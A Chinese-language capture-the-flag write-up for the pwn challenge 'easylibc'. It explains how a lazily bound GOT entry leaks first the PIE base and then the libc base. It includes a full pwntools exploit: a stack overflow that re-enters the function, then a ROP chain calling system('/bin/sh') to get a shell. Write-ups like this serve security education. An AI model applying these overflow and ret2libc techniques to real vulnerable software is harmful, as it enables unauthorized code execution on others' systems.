# easylibc

## 题目简述

程序启用了 PIE，并打印 `read` 的 GOT 表项内容。第一次调用 `read` 之前，该表项尚未完成延迟绑定，仍指向主程序 PLT 内的解析跳板，可用于计算 PIE 基址；第一次溢出读取发生后，动态链接器把同一 GOT 表项改写为 libc 中 `read` 的真实地址。返回到正确的打印准备位置，就能用同一信息源完成第二阶段 libc 泄露。

## 解题过程

延迟绑定前后的 GOT 状态为：

```text
首次 read 前：read@got → read@plt 内的 resolver 跳板（属于 PIE）
首次 read 后：read@got → libc 中真实 read（属于 libc）
```

初始泄露减去题目中 PLT 跳板偏移 `0x1060` 得到 PIE 基址。第一次溢出覆盖保存的 `rbp` 和返回地址，回到 `0x11EE`；该位置必须位于打印参数装载之前，否则寄存器参数没有重新准备好，泄露会不稳定。

```python
from pwn import ELF, ROP, context, flat, p64, process

context(os="linux", arch="amd64")

io = process("./pwn")
libc = ELF("./libc.so.6", checksec=False)

io.recvuntil(b"How can I use ")
initial_read_got = int(io.recvn(14), 16)
pie = initial_read_got - 0x1060

fake_rbp = pie + 0x4500
reenter_before_argument_setup = pie + 0x11EE

stage1 = b"A" * 0x20 + p64(fake_rbp) + p64(reenter_before_argument_setup)
io.send(stage1)

io.recvuntil(b"How can I use ")
resolved_read = int(io.recvn(14), 16)
libc.address = resolved_read - libc.sym["read"]

rop = ROP(libc)
ret = rop.find_gadget(["ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = next(libc.search(b"/bin/sh\x00"))

stage2 = flat(
    b"A" * 0x20,
    fake_rbp,
    ret,
    pop_rdi,
    bin_sh,
    libc.sym["system"],
)
io.send(stage2)
io.interactive()
```

`fake_rbp` 选在 PIE 的可写区域，避免返回路径中按 `rbp` 访存时访问无效地址。

## 方法总结

- 核心技巧：利用 lazy binding 让同一 GOT 表项先泄露 PIE、解析后再泄露 libc。
- 识别信号：程序在第一次目标函数调用前后重复打印 GOT 内容，且值从 PLT 区间变为 libc 区间时，应想到延迟绑定状态变化。
- 复用要点：重入地址必须位于参数准备指令之前；同时为函数尾声或后续访存设置有效 `rbp`，不要只关注返回地址。
